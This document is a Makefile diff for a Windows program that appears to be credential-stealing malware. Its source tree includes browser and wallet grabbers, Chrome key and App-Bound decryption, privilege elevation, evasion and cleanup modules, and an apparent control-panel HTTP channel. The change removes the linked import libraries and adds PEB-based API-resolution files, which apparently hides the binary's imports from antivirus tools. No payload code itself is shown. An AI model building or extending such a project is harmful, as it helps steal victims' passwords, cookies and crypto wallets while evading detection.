@@ -1,7 +1,7 @@
 CC = x86_64-w64-mingw32-gcc
 NASM = nasm
 CFLAGS = -Wall -Wextra -Wno-error -O2 -fdata-sections -ffunction-sections -Iinclude -Isrc -Isrc/rt -Isrc/utils -Isrc/parsers -Isrc/browsers -Isrc/wallets -Isrc/system -Isrc/network -Isrc/crypto -Isrc/evasion -Isrc/cleanup
-LDFLAGS = -nostdlib -Wl,--gc-sections -Wl,-e,mainCRTStartup -Wl,--subsystem,windows -lws2_32 -lkernel32 -luser32 -ladvapi32 -lbcrypt -lcrypt32 -lshell32 -lole32 -loleaut32 -lgdi32
+LDFLAGS = -nostdlib -Wl,--gc-sections -Wl,-e,mainCRTStartup -Wl,--subsystem,windows
 
 SRCS = src/main.c \
        src/rt/rt_startup.c \
@@ -27,6 +27,7 @@ SRCS = src/main.c \
        src/network/socks5.c \
        src/network/panel_http.c \
        src/network/ws2.c \
+       src/network/ws2_peb.c \
        src/network/proxy.c \
        src/network/chunked.c \
        src/network/schannel.c \
@@ -51,6 +52,9 @@ SRCS = src/main.c \
        src/crypto/chrome_key.c \
        src/crypto/appbound.c \
        src/crypto/elevator.c \
+       src/crypto/bcrypt_peb.c \
+       src/crypto/com_peb.c \
+       src/crypto/crypt32_peb.c \
        src/browsers/cdp_grabber.c \
        src/utils/base64.c \
        src/utils/file_utils.c \
